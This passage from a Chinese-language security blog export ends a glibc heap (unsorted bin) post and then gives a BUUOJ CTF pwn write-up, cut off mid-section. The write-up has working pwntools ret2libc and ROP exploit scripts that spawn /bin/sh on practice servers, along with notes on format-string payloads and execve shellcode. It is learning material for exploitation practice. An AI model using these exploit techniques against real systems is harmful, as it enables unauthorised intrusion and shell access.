class="hljs-number">78</span><br><span class="hljs-attribute">Now</span> emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br><span class="hljs-attribute">And</span> we write it with the target address-<span class="hljs-number">16</span> (in <span class="hljs-number">32</span>-bits machine, it should be target address-<span class="hljs-number">8</span>):<span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">0</span>d<span class="hljs-number">232508</span><br><br><span class="hljs-attribute">Let</span>&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br><span class="hljs-attribute">0x7ffe0d232518</span>: <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br></code></pre></div></td></tr></table></figure><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。<strong>而且，需要注意的是，2.28版本已经无效</strong> </p><p>通过这个方法你可以 : </p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>修改 heap 中的 <code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul><h1 id="bin-attack-总结"><a href="#bin-attack-总结" class="headerlink" title="bin attack 总结"></a>bin attack 总结</h1><ul><li>主要就是将bin的fd指针指向我们想要的位置, 从而在下次malloc中获得目标位置的chunk, 进一步修改目标地址<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>与上条类似，我们同样将分配作为content的chunk称为content chunk<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>为了方便，我们将分配作为note的chunk称为note chunk<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc_malloc</tag>
      
      <tag>源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ_Writeup</title>
    <link href="/2021-07/pwn-BUUOJ-writeup/"/>
    <url>/2021-07/pwn-BUUOJ-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前六道题小结-有点懒直接总结"><a href="#1-前六道题小结-有点懒直接总结" class="headerlink" title="1.前六道题小结:(有点懒直接总结)"></a>1.前六道题小结:(有点懒直接总结)</h2><ul><li>第一题测试nc命令</li><li>pwn1_sctf_2016: 一堆std::string啥的操作<strong>根本没看懂是什么</strong>.</li><li>ciscn_n_1: 栈溢出覆盖浮点数过if语句, 直接到IDA View查看十六进制的数值就可以了</li><li>剩下的几题太简单了(回头来看的题都是这么简单!) </li></ul><h2 id="2-ciscn-2019-c-1"><a href="#2-ciscn-2019-c-1" class="headerlink" title="2. ciscn_2019_c_1"></a>2. ciscn_2019_c_1</h2><ul><li>由于没有给出libc库以及libc库的版本, 所以git clone python的LibcSearcher库, 并且学习如何使用.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>ret_addr = <span class="hljs-number">0x4006b9</span> <span class="hljs-comment">#这两个是用ROPgadget找到的, 使用了ROPgadget --binary filename --only &quot;pop|ret&quot; | grep rdi命令</span><br>rdipop_addr = <span class="hljs-number">0x400c83</span><br><br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">28804</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;ice!\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)  <span class="hljs-comment">#class pwnlib.elf.elf.ELF(path, checksec=True)注意参数是路径,别忘了&quot;./&quot;</span><br>plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment">#                     x64机器压入参数     唯一一个参数     ret指令跳转到的地址  函数返回地址(重新到main)</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x58</span> + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;pted\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>addr = u64(p.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#我也不知道这是为啥</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, addr)<br>libc_base = addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment">#                     栈平衡           x64机器压入参数     唯一一个参数       ret指令跳转到的地址</span><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x58</span> + p64(ret_addr) + p64(rdipop_addr) + p64(binsh_addr) + p64(sys_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;ice!\n&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;ted\n&quot;</span>, payload)<br><br>p.interactive() <span class="hljs-comment">#将程序的输出输入流改为 标准输出输入流</span><br></code></pre></div></td></tr></table></figure><p>tips:</p><ul><li><p><code>payload = b&#39;b&#39;*0x58 + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</code></p><p>GOT顾名思义它只是一张表, 第一次链接后存放着函数的起始地址, plt表中使用 jmp *GOT[4], 即GOT表元素的引用, 第三个p64不能改为got_addr!!!!!!!!!!!!!</p></li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher用法.(就是某位国人写的小工具, 至于为啥是str_bin_sh我还不知道.......)</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span><br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>, <span class="hljs-number">0X7ff39014bd90</span>)<br>obj.dump(<span class="hljs-string">&quot;system&quot;</span>)        <span class="hljs-comment">#system 偏移</span><br>obj.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)    <span class="hljs-comment">#/bin/sh 偏移</span><br>obj.dump(<span class="hljs-string">&quot;__libc_start_main_ret&quot;</span>)    <br></code></pre></div></td></tr></table></figure><h2 id="3-PWN5-普通的格式化字符串漏洞"><a href="#3-PWN5-普通的格式化字符串漏洞" class="headerlink" title="3. PWN5(普通的格式化字符串漏洞)"></a>3. PWN5(普通的格式化字符串漏洞)</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtstr_payload</span>(<span class="hljs-params">offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>, write_size_max=<span class="hljs-string">&#x27;long&#x27;</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">                   overflows=<span class="hljs-number">16</span>, strategy=<span class="hljs-string">&quot;small&quot;</span>, badbytes=<span class="hljs-built_in">frozenset</span>(<span class="hljs-params"></span>), offset_bytes=<span class="hljs-number">0</span></span>):</span> → <span class="hljs-built_in">str</span><br><span class="hljs-string">&#x27;&#x27;&#x27;Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. </span><br><span class="hljs-string">The size of the addr is taken from context.bits</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>Parameters:<br>offset (<span class="hljs-built_in">int</span>) – the first formatter’s offset you control<br>writes (<span class="hljs-built_in">dict</span>) – <span class="hljs-built_in">dict</span> <span class="hljs-keyword">with</span> addr, value &#123;addr: value, addr2: value2&#125;<br>numbwritten (<span class="hljs-built_in">int</span>) – number of byte already written by the printf function<br>write_size (<span class="hljs-built_in">str</span>) – must be byte, short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>. Tells <span class="hljs-keyword">if</span> you want to write byte by byte, <br>short by short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span> by <span class="hljs-built_in">int</span> (hhn, hn <span class="hljs-keyword">or</span> n)<br>overflows (<span class="hljs-built_in">int</span>) – how many extra overflows (at size sz) to tolerate to reduce the length of <br>the <span class="hljs-built_in">format</span> string<br>strategy (<span class="hljs-built_in">str</span>) – either ‘fast’ <span class="hljs-keyword">or</span> ‘small’ (‘small’ <span class="hljs-keyword">is</span> default, ‘fast’ can be used <span class="hljs-keyword">if</span> there <br>                                                are many writes)<br>Returns:<br>The payload <span class="hljs-keyword">in</span> order to do needed writes<br></code></pre></div></td></tr></table></figure><h2 id="4-BabyRop-0"><a href="#4-BabyRop-0" class="headerlink" title="4. BabyRop[0]."></a>4. BabyRop<a href="https://blog.csdn.net/weixin_44677409/article/details/113769436">[0]</a>.</h2><p>查看程序的保护机制<img src="https://i.loli.net/2021/07/22/Ri6VUFBHCIbNpmj.png" alt="image-20210722002115059"> </p><p>发现是got表不可写的32位程序<br>拖进ida查看伪代码<img src="https://i.loli.net/2021/07/22/18Yp72mcR5gDEoV.png" alt="image-20210722002553447"> </p><p>sub_80486BB是初始化缓存区的函数<br>发现buf是一个随机数<img src="https://i.loli.net/2021/07/22/k7LqQlvpzZsFEry.png" alt="image-20210722002240287"> </p><p>发现函数中存在strncmp比较函数，其中buf为用户输入的值，s为buf随机数，如果不相等则会退出程序，<u>所以需要想办法绕过这个判断，所以v1的值必须为0</u>.</p><p>v1 = strlen(buf),strlen这个函数有个<strong>缺陷</strong>：遇到\x00直接截断。所以我们要输入第一位数为\x00</p><p>buf被IDA识别为32位数组, 函数返回值是buf[7], 所以直接将buf[7]写成想要的数值即可</p><p>接下来来看最后一个函数<img src="https://i.loli.net/2021/07/22/l6dPBCuI5vsyKNL.png" alt="image-20210722002708919"> </p><p>其中a1即为上文中的v5，假如a1等于127则会执行第一条语句，不会溢出，当a1大于0xE7时就会存在溢出，从而覆盖返回地址</p><p>解题思路：首先通过\x00来绕过判断，覆盖v5为\xff（使得v5尽可能的大），通过wirte函数来泄露write的内存地址，然后利用libc来计算system函数地址，最后利用溢出使得返回地址为system</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28361</span>)<br><span class="hljs-comment">#ignore the strncmp and overwrite buf[7] to the max\xff</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br><span class="hljs-comment">#jump to read(0, buf, a1) and char buf[231]</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>)<br><span class="hljs-comment">#leak the write_addr</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop&quot;</span>, <span class="hljs-number">0</span>)<br>got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x8048825</span><br><br>payload = payload + p32(plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#payload = flat([b&#x27;a&#x27;*(0xe7+0x4), plt, main, 1, got, 4])</span><br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#calc the sys_addr and returned to the main function </span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>, <span class="hljs-number">0</span>)<br>sys_libc = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>write_libc = libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>binsh_libc  = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>libc_base = write_addr - write_libc<br>sys = libc_base + sys_libc<br>binsh = libc_base + binsh_libc<br><br><span class="hljs-comment">#constrct the payload</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh])<br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>tips:</strong>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#新用法get:</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>sla=<span class="hljs-keyword">lambda</span> x,y:io.sendlineafter(x,y)<br>rl=<span class="hljs-keyword">lambda</span> :io.recvline()<br>ru=<span class="hljs-keyword">lambda</span> x:io.recvuntil(x)<br></code></pre></div></td></tr></table></figure><ul><li><p>strlen()函数遇到’\0’就会停止!!!!!!</p></li><li><p>别忘了先是<strong>参数</strong>后是sys的<strong>返回地址</strong>.</p></li><li><p>pack():   Word-size, endianness and signedness is done according to context</p><p>所以, flat()中的wordsize就不用管了, 自动使用相应的pack()函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pwnlib.util.packing.flat(*a, **kw)<br>- flat(*args, preprocessor = <span class="hljs-literal">None</span>, length = <span class="hljs-literal">None</span>, filler = de_bruijn(), <span class="hljs-comment">#???debruijn是个什么东西</span><br>  word_size = <span class="hljs-literal">None</span>, endianness = <span class="hljs-literal">None</span>, sign = <span class="hljs-literal">None</span>) -&gt; <span class="hljs-built_in">str</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="6-ciscn-2019-n-8"><a href="#6-ciscn-2019-n-8" class="headerlink" title="6.ciscn_2019_n_8"></a>6.ciscn_2019_n_8</h2><ul><li>三种方法一应俱全<a href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</li><li>还是看别人的才做的出来, 不然谁会知道:<ul><li>get_flag的返回地址不能乱写，打远程时，如果程序是异常退出了，最后是不给你回显的. </li><li>正常退出需要使用exit(), 所以将get_flag的返回地址写成exit的地址</li><li>如果正常退出, 你不加一个p.recv()接受字符, 仍然没有回显.</li><li>还有就是修改bss段的权限, 高级操作, 又得学一个函数**(还没学)**.</li></ul></li></ul><h2 id="7-not-the-same"><a href="#7-not-the-same" class="headerlink" title="7.not_the_same"></a>7.not_the_same</h2><ul><li>简单的栈溢出题目, 就不截图了, 和第六题是一样的, 需要注意exit正常退出程序后必须recv几个字符远程才会有输出</li><li>可以看到我做了一个万能头, 以后写exp只要复制修改一下就可以了, 还是挺方便的</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26867</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#整理以下思路：45个数组先覆盖掉，然后是get_secrt地址，然后是write地址，</span><br><span class="hljs-comment">#write的返回地址（感觉得是exit的地址），第一个参数1，第二个0x80ECA2D，第三个50字节（就这么长)</span><br><span class="hljs-comment">#还是printf函数的参数简单一点</span><br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>, <span class="hljs-number">0</span>)<br>exit = elf.symbols[<span class="hljs-string">&quot;exit&quot;</span>]<br><span class="hljs-comment">#write = elf.symbols[&quot;write&quot;]</span><br>printf = elf.symbols[<span class="hljs-string">&quot;printf&quot;</span>]<br>get = elf.symbols[<span class="hljs-string">&quot;get_secret&quot;</span>]<br>buf = <span class="hljs-number">0x80ECA2D</span><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">45</span>, get, printf, exit, buf])<br>sl(payload)<br>ra()<br></code></pre></div></td></tr></table></figure><h2 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8.bjdctf_2020_babystack"></a>8.bjdctf_2020_babystack</h2><ul><li>比较简单, 主要的问题是context的默认bit是32, 换成万能头的context.binary就没有问题了</li></ul><h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>过程<a href="https://www.freesion.com/article/93161361727/">[0]</a>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28273</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br><span class="hljs-comment">#思路：先addlog写入128字节的src，下一次循环到getfalg里面用strcpy写入dest实现溢出，返回地址sys，sys返回地址随意，sys参数为sh地址</span><br>elf = ELF(<span class="hljs-string">b&quot;./ciscn_2019_ne_5&quot;</span>, <span class="hljs-number">0</span>)<br>sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh&quot;</span>))<span class="hljs-comment">#可以直接用ELF.search, 或者ROPgadget --binary &quot;&quot; --string &quot;&quot;</span><br>sys = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, sh])<br><span class="hljs-comment">#sla(b&#x27;password:&#x27;, b&#x27;administrator&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;1&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;info:&#x27;, payload)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;4&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<span class="hljs-comment">#只要搞得清楚, 直接只用sendline(), 只是调试有点乱而已(也还好, 现在的输入也不会太多)</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(payload)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#sl(b&#x27;administrator\n1\n&#x27;+payload+b&#x27;\n4&#x27;)甚至可以写成</span><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10. others_shellcode_"></a>10. others_shellcode_</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__asm &#123; <span class="hljs-keyword">int</span> <span class="hljs-number">80</span>h; LINUX - sys_execve &#125; <span class="hljs-comment">//tmd这又是哪门子的LINUX</span><br></code></pre></div></td></tr></table></figure><p>p.s. 关于__asm <a href="https://docs.microsoft.com/en-us/cpp/assembler/inline/asm?view=msvc-160">[0]</a>.</p><p>之前刷题中用到的后门函数都是system(“/bin/sh”)，这次出现了一个新的后门：**execve()**。</p><p>函数定义:<br>**int execve(const char *filename, char <em>const argv[ ], char <em>const envp[ ]);</em></em> </p><p>寄存器eax放execve的系统调用号11；<br>寄存器ebx放文件路径，即第一个参数；<br>寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；<br>寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。</p><p><strong>后两个参数一般为0</strong> </p><p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。如果没有/bin/sh字符串, 那么就先调用read函数读取”/bin/sh”, 尝试”sh”失败, 原因尚未知晓</p><h2 id="11-2018-rop"><a href="#11-2018-rop" class="headerlink" title="11.2018_rop"></a>11.2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">setresuid(); <br>setresgid();<br><span class="hljs-comment">//These two syscalls are like their equivalent kernels calls above, but with the additional ability to set the Saved-User-ID (SUID) or Saved-Group-ID (SGID). re represent</span><br></code></pre></div></td></tr></table></figure><h2 id="12-ciscn-s-3"><a href="#12-ciscn-s-3" class="headerlink" title="12.ciscn_s_3"></a>12.ciscn_s_3</h2><ol><li><p>checksec</p><p><img src="https://i.loli.net/2021/08/06/Exk1cpHYvmls4fJ.png" alt="image-20210806154145249"></p></li><li><p>main函数里面只有vuln, vuln函数里就是简单的sysread syswrite, 都是通过syscall以及系统调用号来执行的</p><img src="https://i.loli.net/2021/08/06/SP7dTJbw4XCQBDm.png" alt="image-20210806154501028" style="zoom:80%;" /> <p>gadgets函数:</p><img src="https://i.loli.net/2021/08/06/OiYpf1UhETLPwo5.png" alt="image-20210806154658559" style="zoom:80%;" /> </li><li><p>最重要的两点</p><ul><li>这两个函数<strong>都不以leave结尾</strong>, 意味着函数结束后没有恢复到之前的栈帧, 进入函数时的ebp的位置即为返回地址, 所以IDA中栈分析是错误的, <strong>真实栈结构还得看汇编代码</strong> </li><li><strong>第一种办法:</strong> 看见了一个mov rax, <strong>3B</strong>h    retn, 代表着我们可以利用这两行代码为执行sys_execve做准备</li><li><strong>第二种办法:SROP</strong> </li><li>下面先用第一种方法.</li></ul></li><li><p>从反汇编代码中看出sys_read几乎无限长字节(0x400), sys_write30个单位, 有明显的栈溢出, 这里我们使用59号系统调用(64位), 构造</p><p><code>execve(&#39;/bin/sh&#39;，0，0）</code> </p><p>但是程序中并未发现/bin/sh, 所以需要手动输入, 